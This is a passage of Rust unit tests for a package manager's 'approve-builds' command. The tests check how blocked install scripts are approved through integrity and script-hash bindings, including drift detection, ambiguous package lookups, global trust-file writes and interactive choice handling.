        // "already approved", NOT silently re-write the entry.
        let err = run(dir.path(), Some("esbuild"), false, false, true)
            .await
            .unwrap_err();
        let msg = err.to_string();
        assert!(
            msg.contains("already approved"),
            "expected an 'already approved' message, got: {msg}"
        );
    }

    /// **AUDIT REGRESSION (Phase 4 D-impl-2):** if EVERY package in the
    /// persisted state is already approved, `--list` should report nothing
    /// to approve (empty effective blocked set), not the stale entries.
    #[tokio::test]
    async fn approve_builds_list_reports_nothing_when_all_persisted_blocked_are_already_approved() {
        let dir = tempdir().unwrap();
        write_state(
            dir.path(),
            vec![
                make_blocked("esbuild", "0.25.1"),
                make_blocked("sharp", "0.33.0"),
            ],
        );
        write_manifest(
            &dir.path().join("package.json"),
            &serde_json::json!({
                "name": "test",
                "version": "0.0.0",
                "lpm": {
                    "trustedDependencies": {
                        "esbuild@0.25.1": {
                            "integrity": "sha512-esbuild-integrity",
                            "scriptHash": "sha256-esbuild-hash"
                        },
                        "sharp@0.33.0": {
                            "integrity": "sha512-sharp-integrity",
                            "scriptHash": "sha256-sharp-hash"
                        }
                    }
                }
            }),
        );

        run(dir.path(), None, false, true, true).await.unwrap();

        // The package.json must be byte-identical (no rewrite happened)
        let after = read_manifest(&dir.path().join("package.json"));
        assert_eq!(
            after["lpm"]["trustedDependencies"]
                .as_object()
                .unwrap()
                .len(),
            2
        );
    }

    /// **AUDIT REGRESSION (Phase 4 D-impl-2):** drift overrides "already approved".
    /// If the persisted state shows a script_hash that drifts from the
    /// stored binding, the package MUST appear in the effective blocked
    /// set (this is the whole point of script-hash binding).
    #[tokio::test]
    async fn approve_builds_yes_does_not_skip_packages_with_binding_drift() {
        let dir = tempdir().unwrap();
        // State file claims script_hash = sha256-NEW
        let mut blocked = make_blocked("esbuild", "0.25.1");
        blocked.script_hash = Some("sha256-NEW".to_string());
        blocked.binding_drift = true;
        write_state(dir.path(), vec![blocked]);

        // Manifest has the OLD binding
        write_manifest(
            &dir.path().join("package.json"),
            &serde_json::json!({
                "name": "test",
                "version": "0.0.0",
                "lpm": {
                    "trustedDependencies": {
                        "esbuild@0.25.1": {
                            "integrity": "sha512-esbuild-integrity",
                            "scriptHash": "sha256-OLD"
                        }
                    }
                }
            }),
        );

        // --yes should re-approve esbuild with the NEW script_hash from
        // the state file because the binding drifted.
        run(dir.path(), None, true, false, true).await.unwrap();

        let after = read_manifest(&dir.path().join("package.json"));
        let binding = &after["lpm"]["trustedDependencies"]["esbuild@0.25.1"];
        assert_eq!(
            binding["scriptHash"], "sha256-NEW",
            "drift must trigger re-approval with the new script hash"
        );
    }

    // ── Phase 4 audit Finding 3 — --json mode emits exactly one JSON payload ──
    //
    // The bug: emit_yes_warning_banner unconditionally calls tracing::warn!,
    // and the tracing subscriber in main.rs writes to stdout (no
    // .with_writer(stderr) configured). So a `--yes --json` invocation
    // produces a WARN line on stdout BEFORE the JSON object, breaking any
    // downstream JSON.parse.
    //
    // We can't easily intercept tracing output from a unit test (the
    // global subscriber is set once per process), so the unit-level
    // regression here just verifies the BEHAVIOR contract: in JSON mode,
    // emit_yes_warning_banner must NOT call tracing::warn! / println!.
    // The CLI-level test (driving the binary as a subprocess) is the
    // end-to-end gate — see lpm-cli/tests/approve_builds_cli.rs.

    #[tokio::test]
    async fn approve_builds_yes_json_emits_warning_only_in_json_warnings_field() {
        let dir = tempdir().unwrap();
        write_default_manifest(dir.path());
        write_state(dir.path(), vec![make_blocked("esbuild", "0.25.1")]);

        // --yes --json — verify the manifest mutation lands AND the
        // structured warning is in the JSON warnings array. The full
        // stdout-purity test is at the CLI level (subprocess capture).
        run(dir.path(), None, true, false, true).await.unwrap();

        let after = read_manifest(&dir.path().join("package.json"));
        assert!(after["lpm"]["trustedDependencies"]["esbuild@0.25.1"].is_object());
        // The function should have completed without panicking. The
        // CLI-level subprocess test verifies the stdout layer.
    }

    // ─── M5.3: approve-builds --global ───────────────────────────────

    use crate::build_state::compute_blocked_set_fingerprint;
    use crate::global_blocked_set::{AggregateBlockedRow, AggregateBlockedSet};
    use chrono::Utc;
    use lpm_global::{GlobalManifest, PackageEntry, PackageSource};

    fn scoped_lpm_home(path: &Path) -> crate::test_env::ScopedEnv {
        crate::test_env::ScopedEnv::set([("LPM_HOME", path.as_os_str().to_owned())])
    }

    fn row(name: &str, version: &str, origins: &[&str]) -> AggregateBlockedRow {
        AggregateBlockedRow {
            name: name.into(),
            version: version.into(),
            integrity: Some(format!("sha512-{name}{version}")),
            script_hash: Some(format!("sha256-{name}{version}")),
            phases_present: vec!["postinstall".into()],
            binding_drift: false,
            origins: origins.iter().map(|s| (*s).to_string()).collect(),
        }
    }

    fn seed_global_manifest_with_blocked(
        root: &lpm_common::LpmRoot,
        top_level: &str,
        top_level_version: &str,
        blocked_rows: Vec<AggregateBlockedRow>,
    ) {
        let rel_root = format!("installs/{}@{}", top_level, top_level_version);
        let install_root = root.global_root().join(&rel_root);
        std::fs::create_dir_all(&install_root).unwrap();

        let blocked_packages: Vec<crate::build_state::BlockedPackage> = blocked_rows
            .into_iter()
            .map(|row| crate::build_state::BlockedPackage {
                name: row.name,
                version: row.version,
                integrity: row.integrity,
                script_hash: row.script_hash,
                phases_present: row.phases_present,
                binding_drift: row.binding_drift,
                // Phase 46 fields default to None when constructing
                // from the `ApproveRow` test helper. The row type
                // doesn't carry tier/provenance/etc. yet; when later
                // phases need them, extend `ApproveRow` in lockstep.
                static_tier: None,
                provenance_at_capture: None,
                published_at: None,
                behavioral_tags_hash: None,
                behavioral_tags: None,
            })
            .collect();

        let state = BuildState {
            state_version: BUILD_STATE_VERSION,
            blocked_set_fingerprint: compute_blocked_set_fingerprint(&blocked_packages),
            captured_at: Utc::now().to_rfc3339(),
            blocked_packages,
        };
        crate::build_state::write_build_state(&install_root, &state).unwrap();

        let mut manifest = GlobalManifest::default();
        manifest.packages.insert(
            top_level.into(),
            PackageEntry {
                saved_spec: "^1".into(),
                resolved: top_level_version.into(),
                integrity: "sha512-top-level".into(),
                source: PackageSource::UpstreamNpm,
                installed_at: Utc::now(),
                root: rel_root,
                commands: vec![],
            },
        );
        lpm_global::write_for(root, &manifest).unwrap();
    }

    #[test]
    fn lookup_aggregate_by_arg_matches_bare_name_when_unique() {
        let rows = vec![row("esbuild", "0.25.1", &["eslint"])];
        let hit = match lookup_aggregate_by_arg(&rows, "esbuild") {
            AggregateLookup::Match(r) => r,
            other => panic!("expected Match, got {other:?}"),
        };
        assert_eq!(hit.name, "esbuild");
    }

    #[test]
    fn lookup_aggregate_by_arg_matches_name_at_version() {
        let rows = vec![
            row("esbuild", "0.25.1", &["eslint"]),
            row("esbuild", "0.25.2", &["typescript"]),
        ];
        let hit = match lookup_aggregate_by_arg(&rows, "esbuild@0.25.2") {
            AggregateLookup::Match(r) => r,
            other => panic!("expected Match, got {other:?}"),
        };
        assert_eq!(hit.version, "0.25.2");
    }

    #[test]
    fn lookup_aggregate_by_arg_returns_notfound_for_unknown_name() {
        let rows = vec![row("esbuild", "0.25.1", &["eslint"])];
        assert!(matches!(
            lookup_aggregate_by_arg(&rows, "ghost"),
            AggregateLookup::NotFound
        ));
    }

    /// M5 audit finding 1 (Medium): bare-name lookup against a rows set
    /// where two versions exist for the same name MUST return Ambiguous,
    /// not silently take the first. Pre-fix `find_aggregate_by_arg` did
    /// the latter — a latent data-corruption bug where
    /// `lpm approve-builds --global esbuild` would approve the wrong
    /// version binding without any feedback.
    #[test]
    fn lookup_aggregate_by_arg_is_ambiguous_when_bare_name_matches_multiple_versions() {
        let rows = vec![
            row("esbuild", "0.25.1", &["eslint"]),
            row("esbuild", "0.25.2", &["typescript"]),
        ];
        match lookup_aggregate_by_arg(&rows, "esbuild") {
            AggregateLookup::Ambiguous { candidates } => {
                assert_eq!(candidates.len(), 2);
            }
            other => panic!(
                "expected Ambiguous — bare `esbuild` matches two versions, \
                 got {other:?}"
            ),
        }
    }

    /// name@version CAN be ambiguous too: two install roots that contain
    /// the same `name@version` but with different (integrity, script_hash)
    /// bindings (e.g., tarball swap between installs) produce two
    /// aggregate rows per M5's dedup rule. User MUST disambiguate; silent
    /// first-match would approve the wrong binding.
    #[test]
    fn lookup_aggregate_by_arg_is_ambiguous_when_name_at_version_matches_multiple_bindings() {
        let mut a = row("esbuild", "0.25.1", &["eslint"]);
        a.integrity = Some("sha512-A".into());
        let mut b = row("esbuild", "0.25.1", &["typescript"]);
        b.integrity = Some("sha512-B".into());
        let rows = vec![a, b];
        match lookup_aggregate_by_arg(&rows, "esbuild@0.25.1") {
            AggregateLookup::Ambiguous { candidates } => {
                assert_eq!(candidates.len(), 2);
            }
            other => panic!("expected Ambiguous across distinct bindings: {other:?}"),
        }
    }

    #[test]
    fn group_remaining_rows_by_origin_omits_rows_already_decided_everywhere() {
        let shared = row("esbuild", "0.25.1", &["eslint", "typescript"]);
        let unique = row("sharp", "0.33.0", &["typescript"]);
        let agg = AggregateBlockedSet {
            rows: vec![shared.clone(), unique],
            unreadable_origins: vec![],
        };
        let mut decided = std::collections::HashSet::new();
        decided.insert(AggregateRowKey::from_row(&shared));

        let grouped = group_remaining_rows_by_origin(&agg, &decided);
        assert!(!grouped.contains_key("eslint"));
        let ts_rows = grouped
            .get("typescript")
            .expect("typescript should still have remaining rows");
        assert_eq!(ts_rows.len(), 1);
        assert_eq!(ts_rows[0].name, "sharp");
    }

    /// End-to-end: `run_global_named` surfaces the ambiguity as a
    /// Script error whose message names all candidates so the user
    /// can re-run with a disambiguating `name@version`.
    #[tokio::test]
    async fn run_global_named_surfaces_bare_name_ambiguity_with_candidates() {
        let tmp = tempdir().unwrap();
        let root = lpm_common::LpmRoot::from_dir(tmp.path());
        let agg = AggregateBlockedSet {
            rows: vec![
                row("esbuild", "0.25.1", &["eslint"]),
                row("esbuild", "0.25.2", &["typescript"]),
            ],
            unreadable_origins: vec![],
        };
        let err = run_global_named(&root, &agg, "esbuild", true)
            .await
            .unwrap_err();
        let msg = err.to_string();
        assert!(msg.contains("ambiguous"), "error must say ambiguous: {msg}");
        assert!(
            msg.contains("esbuild@0.25.1") && msg.contains("esbuild@0.25.2"),
            "error must list both candidates so the user can disambiguate: {msg}"
        );
        // Trust file must NOT have been written on ambiguity — no
        // row was approved.
        let trust = lpm_global::trusted_deps::read_for(&root).unwrap();
        assert!(trust.trusted.is_empty(), "no writes on ambiguity");
    }

    /// --list (read-only) with the default group setting renders every
    /// row once with its origin list. Flat shape; each row shows
    /// `name @ version — used by A, B`.
    #[test]
    fn print_global_list_handles_empty_aggregate_without_panicking() {
        let agg = AggregateBlockedSet::default();
        print_global_list(&agg, false, false).unwrap();
        print_global_list(&agg, true, false).unwrap();
        print_global_list(&agg, false, true).unwrap();
    }

    /// `--yes` writes every aggregate row into the global trust file
    /// AND surfaces a `warnings` entry in JSON mode so agents can
    /// detect bulk-approval flows.
    #[tokio::test]
    async fn run_global_bulk_yes_writes_each_row_to_trust_file() {
        let tmp = tempdir().unwrap();
        let root = lpm_common::LpmRoot::from_dir(tmp.path());
        let agg = AggregateBlockedSet {
            rows: vec![
                row("esbuild", "0.25.1", &["eslint"]),
                row("sharp", "0.33.0", &["typescript"]),
            ],
            unreadable_origins: vec![],
        };
        // JSON mode so no interactive prompts and output goes to stdout.
        run_global_bulk_yes(&root, &agg, true).await.unwrap();
        let trust = lpm_global::trusted_deps::read_for(&root).unwrap();
        assert!(trust.trusted.contains_key("esbuild@0.25.1"));
        assert!(trust.trusted.contains_key("sharp@0.33.0"));
    }

    /// Named-package approval writes exactly ONE entry to the trust
    /// file, leaving other rows unapproved.
    #[tokio::test]
    async fn run_global_named_approves_only_the_matched_row() {
        let tmp = tempdir().unwrap();
        let root = lpm_common::LpmRoot::from_dir(tmp.path());
        let agg = AggregateBlockedSet {
            rows: vec![
                row("esbuild", "0.25.1", &["eslint"]),
                row("sharp", "0.33.0", &["typescript"]),
            ],
            unreadable_origins: vec![],
        };
        run_global_named(&root, &agg, "sharp", true).await.unwrap();
        let trust = lpm_global::trusted_deps::read_for(&root).unwrap();
        assert!(trust.trusted.contains_key("sharp@0.33.0"));
        assert!(!trust.trusted.contains_key("esbuild@0.25.1"));
    }

    /// Unknown package name surfaces NotFound with an actionable hint
    /// pointing at `--list`.
    #[tokio::test]
    async fn run_global_named_errors_for_unknown_package() {
        let tmp = tempdir().unwrap();
        let root = lpm_common::LpmRoot::from_dir(tmp.path());
        let agg = AggregateBlockedSet {
            rows: vec![row("esbuild", "0.25.1", &["eslint"])],
            unreadable_origins: vec![],
        };
        let err = run_global_named(&root, &agg, "ghost", true)
            .await
            .unwrap_err();
        let msg = err.to_string();
        assert!(msg.contains("not in the global blocked set"));
        assert!(msg.contains("--global --list"));
    }

    /// `--list --yes` together are rejected with the same error shape
    /// as the project-scoped flow.
    #[tokio::test]
    async fn run_global_rejects_list_plus_yes() {
        let tmp = std::env::temp_dir();
        let _env = scoped_lpm_home(&tmp);
        let err = run_global(None, true, true, false, true).await.unwrap_err();
        assert!(err.to_string().contains("conflicts with `--yes`"));
    }

    #[tokio::test]
    async fn run_global_grouped_interactive_path_is_reachable() {
        let tmp = tempdir().unwrap();
        let root = lpm_common::LpmRoot::from_dir(tmp.path());
        seed_global_manifest_with_blocked(
            &root,
            "eslint",
            "9.24.0",
            vec![row("esbuild", "0.25.1", &["eslint"])],
        );
        let _env = scoped_lpm_home(tmp.path());
        let err = run_global(None, false, false, true, true)
            .await
            .unwrap_err();
        let msg = err.to_string();
        assert!(msg.contains("needs a TTY for the interactive walk"));
    }

    /// --group auto-enable threshold constant is at the expected value.
    /// Pin it so a future refactor doesn't accidentally change the
    /// threshold without the plan doc being updated.
    #[test]
    fn group_auto_threshold_is_10() {
        assert_eq!(GROUP_AUTO_THRESHOLD, 10);
    }

    // ─── Phase 46 P7 Chunk 3 — interactive choice mapping ─────────
    //
    // The Select itself can't be unit-tested without driving cliclack
    // (which expects a TTY); these tests pin the pure decision
    // projection that the Select callback feeds into. The actual TUI
    // wiring is exercised end-to-end by the C5 reference fixture.

    #[test]
    fn p7_choice_decision_maps_approve_pair_to_true() {
        assert_eq!(InteractiveChoice::Approve.decision(), Some(true));
        assert_eq!(InteractiveChoice::AcceptNew.decision(), Some(true));
    }

    #[test]
    fn p7_choice_decision_maps_skip_pair_to_false() {
        assert_eq!(InteractiveChoice::Skip.decision(), Some(false));
        assert_eq!(InteractiveChoice::KeepOld.decision(), Some(false));
    }

    #[test]
    fn p7_choice_decision_returns_none_for_view_and_quit() {
        assert_eq!(InteractiveChoice::View.decision(), None);
        assert_eq!(InteractiveChoice::Quit.decision(), None);
    }

    #[test]
    fn p7_keepold_does_not_imply_approve() {
        // Pin the signoff-B(i) contract: KeepOld is decline, not a
        // resolver mutation. If a future refactor accidentally
        // remaps KeepOld to true (e.g., trying to "remember" the old
        // approval somehow writes a new binding), this test fails.
        assert_eq!(
            InteractiveChoice::KeepOld.decision(),
            Some(false),
            "KeepOld must collapse to decline (false), NEVER approve. \
             Per signoff B(i): no resolver pin, no manifest write."
        );
    }
}
